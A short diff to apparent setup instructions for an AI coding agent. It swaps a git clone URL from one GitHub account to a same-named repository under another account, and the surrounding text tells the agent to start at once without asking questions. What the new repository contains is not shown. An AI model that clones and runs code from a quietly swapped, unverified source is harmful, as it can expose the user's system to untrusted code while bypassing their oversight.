@@ -22,7 +22,7 @@ Start immediately with Step 1. Do not ask any questions before starting.
 Run the following commands:
 
 ```bash
-git clone https://github.com/jackson-video-resources/claude-tradingview-mcp-trading
+git clone https://github.com/lisco111-bot/claude-tradingview-mcp-trading
 cd claude-tradingview-mcp-trading
 ```
 
